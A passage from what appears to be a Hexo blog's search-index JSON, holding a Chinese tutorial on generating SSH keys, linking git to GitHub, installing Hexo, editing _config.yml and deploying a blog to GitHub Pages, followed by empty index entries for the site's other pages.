号，创建New Repository，之后你所有的博客动态都会在Respoitory更新</p>\n<p><img src=\"https://i.loli.net/2019/10/03/clVHLgqGdfJ8W6x.png\" alt=\"20191003131029.png\"><br><img src=\"https://i.loli.net/2019/10/03/GI6i4wEpoBc5gQx.png\" alt=\"20191003131223.png\"></p>\n<blockquote>\n<p>在创建Repository的时候，Repository name必须是username.github.io<br>不然可能会导致本地和github无法连接。<br>其他的暂时可以忽略，点击Create repository</p>\n</blockquote>\n<h3 id=\"4-配置SSH-Keys\"><a href=\"#4-配置SSH-Keys\" class=\"headerlink\" title=\"4.配置SSH Keys\"></a><strong>4.配置SSH Keys</strong></h3><p>SSH Keys是用来连接本地的git项目和Github的，通过SSH Keys可以使项目保持更新。</p>\n<ul>\n<li><p>检查SSH Keys的设置<br>  <br>检查自己的电脑上是否已经存在SSH Keys。右键打开Git bush here：<br></p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd ~<span class=\"regexp\">/.ssh</span></span><br></pre></td></tr></table></figure>\n\n<p>  <img src=\"https://i.loli.net/2019/10/03/atADwRP16d59iFZ.png\" alt=\"20191003140453.png\"></p>\n</li>\n</ul>\n<p>出现 <strong>No such file or diectory</strong>，电脑上面还未有SSH Keys</p>\n<ul>\n<li><p>生成新的SSH Keys：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh-keygen -t rsa -C <span class=\"string\">\"邮件地址@youremail.com\"</span></span><br><span class=\"line\">Generating public/private rsa key pair.</span><br><span class=\"line\">Enter file <span class=\"keyword\">in</span> which to save the key (<span class=\"regexp\">/Users/y</span>our_user_directory/.ssh/id_rsa):&lt;回车&gt;</span><br></pre></td></tr></table></figure>\n\n<p>邮箱地址是你的注册github的邮箱，之后系统会提示，要求你输入新密码:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enter passphrase (empty <span class=\"keyword\">for</span> no passphrase):&lt;密码&gt;</span><br><span class=\"line\">Enter same passphrase again:&lt;再次输入密码&gt;</span><br></pre></td></tr></table></figure>\n\n<p>密码是作为提交项目时候的一个验证。你可以选择不输入密码，直接设置为空，但是为了安全，建议设置密码。<strong>注意</strong>：<strong>这里输入密码的时候是看不见的</strong><br><img src=\"https://i.loli.net/2019/10/03/D7VKGMNkr8x4twF.png\" alt=\"20191003142919.png\"></p>\n<p>当弹出这样的界面，就成功设置SSH Keys了</p>\n</li>\n</ul>\n<p>然后输入：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat ~<span class=\"regexp\">/.ssh/i</span>d_rsa.pub</span><br></pre></td></tr></table></figure>\n\n<p>将输出的内容复制，进到Github个人设置里的相应位置<br><img src=\"https://i.loli.net/2019/10/03/T1Ek5FHLS3ajC6e.png\" alt=\"20191003144243.png\"></p>\n<p>继续选中左边菜单栏的<strong><em>SSH and GPG keys</em></strong>，点击<strong><em>New SSH key</em></strong><br><img src=\"https://i.loli.net/2019/10/03/54IZmTwNnsejHhv.png\" alt=\"20191003144526.png\"></p>\n<blockquote>\n<p>Title随意取</p>\n<p>Key就把刚才复制的，粘贴进去就行</p>\n</blockquote>\n<p>添加完毕以后，你的SSH keys应该是这样 :<img src=\"https://i.loli.net/2019/10/03/kjhBZVsFUvza3lH.png\" alt=\"6`YTM}$K07RN2U%`TLS)OEN.png\"></p>\n<h3 id=\"5-测试\"><a href=\"#5-测试\" class=\"headerlink\" title=\"5.测试\"></a><strong>5.测试</strong></h3><p>回到git bush里面，输入以下代码进行测试：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n\n<p>回车，看到以下回显：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>The authenticity <span class=\"keyword\">of</span> host <span class=\"string\">'GitHub.com (207.97.227.239)'</span> can<span class=\"string\">'t be established.</span></span><br><span class=\"line\"><span class=\"string\">2.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span></span><br><span class=\"line\"><span class=\"string\">3.Are you sure you want to continue connecting (yes/no)</span></span><br></pre></td></tr></table></figure>\n\n<p>输入yes，回车（<strong>不能直接回车</strong>）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enter passphrase <span class=\"keyword\">for</span> key <span class=\"string\">'/c/Users/Yi/.ssh/id_rsa'</span>:</span><br></pre></td></tr></table></figure>\n\n<p>输入刚才设置的密码，你会看到“Hi，username.You’ve successfully authenticated…”<br>设置成功</p>\n<h3 id=\"6-设置用户信息\"><a href=\"#6-设置用户信息\" class=\"headerlink\" title=\"6.设置用户信息\"></a><strong>6.设置用户信息</strong></h3><p>现在就是完善个人信息</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"username\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"注册时填写的邮箱\"</span></span><br></pre></td></tr></table></figure>\n\n<p>这一步完成，本机就已经和Github连接！！！</p>\n<h2 id=\"二、搭建Hexo博客\"><a href=\"#二、搭建Hexo博客\" class=\"headerlink\" title=\"二、搭建Hexo博客\"></a><strong>二、搭建Hexo博客</strong></h2><p>接下来就是搭建博客的主体</p>\n<h3 id=\"1-安装Hexo\"><a href=\"#1-安装Hexo\" class=\"headerlink\" title=\"1.安装Hexo\"></a><strong>1.安装Hexo</strong></h3><p>利用npm命令安装Hexo</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo</span><br></pre></td></tr></table></figure>\n\n<p>安装完成后输入 <code>hexo -v</code>检验是否安装好</p>\n<ul>\n<li>然后创建一个新的文件夹，作为博客项目文件夹</li>\n</ul>\n<blockquote>\n<p>在本地创建一个文件夹，文件夹名最好与Repository中博客项目同名：username.github.io</p>\n<p>之后所有命令都在这个文件夹里进行</p>\n</blockquote>\n<p>初始化文件夹，安装独立博客的所有文件(该步骤可能会花较长的时间))</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo init</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>安装相关组件</p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>确保Git已经部署</p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>本地进行浏览</p>\n  <figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g  <span class=\"comment\">//生成静态网页</span></span><br><span class=\"line\">$ hexo s  <span class=\"comment\">//打开本地服务器</span></span><br></pre></td></tr></table></figure>\n\n<p>  <img src=\"https://i.loli.net/2019/10/04/7u5lTiQec3BoPhp.png\" alt=\"20191004123455.png\"></p>\n<p>  成功打开服务器以后会有以上的提示，按住<code>Ctrl+c</code>关闭服务器，现在可以打开浏览器输入<code>127.0.0.1:4000</code>进行查看了</p>\n</li>\n</ul>\n<p>Hexo会有一个默认的主题：landspace，所以你打开博客应该是这样的<br><img src=\"https://i.loli.net/2019/10/04/r5TtMIb8icGX6Sp.png\" alt=\"20191004124344.png\"></p>\n<h3 id=\"2-将博客部署到Github\"><a href=\"#2-将博客部署到Github\" class=\"headerlink\" title=\"2.将博客部署到Github\"></a><strong>2.将博客部署到Github</strong></h3><p>部署之前，可以在配置文件 <strong><em>_config.yml</em></strong> 中进行一些个性化修改<br><img src=\"https://i.loli.net/2019/10/04/2d8aHT7IspmiYSA.png\" alt=\"20191004124904.png\"></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里贴一份网上看到的  可以复制替换原来的  但是替换之前最好备份 可能会出错</span><br><span class=\"line\">那要么你就对照着看一下改就好</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Hexo Configuration</span><br><span class=\"line\">## Docs: http://zespia.tw/hexo/docs/configure.html</span><br><span class=\"line\">## Source: https://github.com/tommy351/hexo/</span><br><span class=\"line\"></span><br><span class=\"line\"># Site 这里的配置，哪项配置反映在哪里，可以参考我的博客</span><br><span class=\"line\">title: My Blog #博客名</span><br><span class=\"line\">subtitle: to be continued... #副标题</span><br><span class=\"line\">description: My blog #给搜索引擎看的，对网站的描述，可以自定义</span><br><span class=\"line\">author: Yourname #作者，在博客底部可以看到</span><br><span class=\"line\">email: yourname@yourmail.com #你的联系邮箱</span><br><span class=\"line\">language: zh-CN #中文。如果不填则默认英文</span><br><span class=\"line\"></span><br><span class=\"line\"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class=\"line\">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span><br><span class=\"line\">url: http:<span class=\"comment\">//yoursite.com</span></span><br><span class=\"line\">root: <span class=\"regexp\">/</span></span><br><span class=\"line\"><span class=\"regexp\">permalink: :year/</span>:month/:day/:title/</span><br><span class=\"line\">tag_dir: tags</span><br><span class=\"line\">archive_dir: archives</span><br><span class=\"line\">category_dir: categories</span><br><span class=\"line\"></span><br><span class=\"line\"># Writing 文章布局、写作格式的定义，不修改</span><br><span class=\"line\">new_post_name: :title.md # File name of new posts</span><br><span class=\"line\">default_layout: post</span><br><span class=\"line\">auto_spacing: false # Add spaces between asian characters and western characters</span><br><span class=\"line\">titlecase: false # Transform title into titlecase</span><br><span class=\"line\">max_open_file: <span class=\"number\">100</span></span><br><span class=\"line\">filename_case: <span class=\"number\">0</span></span><br><span class=\"line\">highlight:</span><br><span class=\"line\">  enable: <span class=\"literal\">true</span></span><br><span class=\"line\">  backtick_code_block: <span class=\"literal\">true</span></span><br><span class=\"line\">  line_number: <span class=\"literal\">true</span></span><br><span class=\"line\">  tab_replace:</span><br><span class=\"line\"></span><br><span class=\"line\"># Category &amp; Tag</span><br><span class=\"line\">default_category: uncategorized</span><br><span class=\"line\">category_map:</span><br><span class=\"line\">tag_map:</span><br><span class=\"line\"></span><br><span class=\"line\"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span><br><span class=\"line\">## 2: Enable pagination</span><br><span class=\"line\">## 1: Disable pagination</span><br><span class=\"line\">## 0: Fully Disable</span><br><span class=\"line\">archive: <span class=\"number\">1</span></span><br><span class=\"line\">category: <span class=\"number\">1</span></span><br><span class=\"line\">tag: <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"># Server 不修改</span><br><span class=\"line\">## Hexo uses Connect as a server</span><br><span class=\"line\">## You can customize the logger format as defined in</span><br><span class=\"line\">## http://www.senchalabs.org/connect/logger.html</span><br><span class=\"line\">port: <span class=\"number\">4000</span></span><br><span class=\"line\">logger: <span class=\"literal\">false</span></span><br><span class=\"line\">logger_format:</span><br><span class=\"line\"></span><br><span class=\"line\"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span><br><span class=\"line\">## Hexo uses Moment.js to parse and display date</span><br><span class=\"line\">## You can customize the date format as defined in</span><br><span class=\"line\">## http://momentjs.com/docs/#/displaying/format/</span><br><span class=\"line\">date_format: YYYY-M-D</span><br><span class=\"line\">time_format: H:mm:ss</span><br><span class=\"line\"></span><br><span class=\"line\"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span><br><span class=\"line\">## Set per_page to 0 to disable pagination</span><br><span class=\"line\">per_page: <span class=\"number\">10</span></span><br><span class=\"line\">pagination_dir: page</span><br><span class=\"line\"></span><br><span class=\"line\"># Disqus Disqus插件，我们会替换成“多说”，不修改</span><br><span class=\"line\">disqus_shortname:</span><br><span class=\"line\"></span><br><span class=\"line\"># Extensions 这里配置站点所用主题和插件，暂时默认</span><br><span class=\"line\">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span><br><span class=\"line\">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span><br><span class=\"line\">theme: landscape</span><br><span class=\"line\">exclude_generator:</span><br><span class=\"line\">plugins:</span><br><span class=\"line\">- hexo-generator-feed</span><br><span class=\"line\">- hexo-generator-sitemap</span><br><span class=\"line\"></span><br><span class=\"line\"># Deployment 站点部署到github要配置</span><br><span class=\"line\">## Docs: http://zespia.tw/hexo/docs/deploy.html</span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repository: </span><br><span class=\"line\">  branch: master</span><br></pre></td></tr></table></figure>\n\n<p>修改好之后，打开Github个人主页的Repository，进入到自己的博客项目，复制好项目的SSH码<br><img src=\"https://i.loli.net/2019/10/04/pRgvEuz3ibGwx4Q.png\" alt=\"20191004125316.png\"></p>\n<p>然后打开博客的配置文件 <strong><em>_config.yml</em></strong> 在最后面找到<code>Deployment</code>,将SSH码粘贴到repository后(冒号后面要空一格)</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repository: </span><br><span class=\"line\">  branch: master</span><br></pre></td></tr></table></figure>\n\n<p>然后执行命令（每次修改博客之后都要进行一遍）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo clean <span class=\"comment\">// 清除存缓（不用每次执行）</span></span><br><span class=\"line\">$ hexo g     <span class=\"comment\">// 修改生成</span></span><br><span class=\"line\">$ hexo s     <span class=\"comment\">// 修改预览（不用每次执行） </span></span><br><span class=\"line\">$ hexo d     <span class=\"comment\">// 修改部署</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>执行hexo d进行博客部署的时候，会需要密码输入,确认身份</p>\n</blockquote>\n<p>过一会儿就能访问<code>username.github.io</code>进行查看了</p>\n<p>到这里搭建博客的工作也圆满结束了</p>\n<h3 id=\"3-写博客\"><a href=\"#3-写博客\" class=\"headerlink\" title=\"3.写博客\"></a><strong>3.写博客</strong></h3><p>在博客的根目录下找到<code>source/_post</code>,空白处Git Bush Here</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo <span class=\"keyword\">new</span> <span class=\"string\">'你想要的文章名字'</span></span><br></pre></td></tr></table></figure>\n\n<p>然后会在这个文件夹里面会生成一个Markdown文件，博客都是用Markdown写的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新生成的md文件，会自动生成:</span><br><span class=\"line\">---</span><br><span class=\"line\">title: </span><br><span class=\"line\">date: </span><br><span class=\"line\">categories:</span><br><span class=\"line\">tags:</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n\n<p>这个模板文件在<code>scaffolds/post.md</code>中，可以进行增删</p>\n<h3 id=\"4-更换主题\"><a href=\"#4-更换主题\" class=\"headerlink\" title=\"4.更换主题\"></a><strong>4.更换主题</strong></h3><p>先进入到博客的根目录，使用clone的方法将主题下载下来</p>\n<p>然后</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd theme/主题名</span><br><span class=\"line\">$ git pull</span><br></pre></td></tr></table></figure>\n\n<p>回到根目录下，打开 <strong><em>_config.yml</em></strong>，找到<code>theme</code>，然后设置<code>theme:主题名</code>，接着就是</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n\n<p>过一会儿，主题就换好啦</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>大体的流程就是这样，这几天搭博客，还是遇到了许多的问题，这里算是做一个总结，以后也方便查看。</p>\n","categories":["Summary"],"tags":["hexo"]},{"title":"about","url":"http://yoursite.com/about/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://yoursite.com/tag/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://yoursite.com/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]}]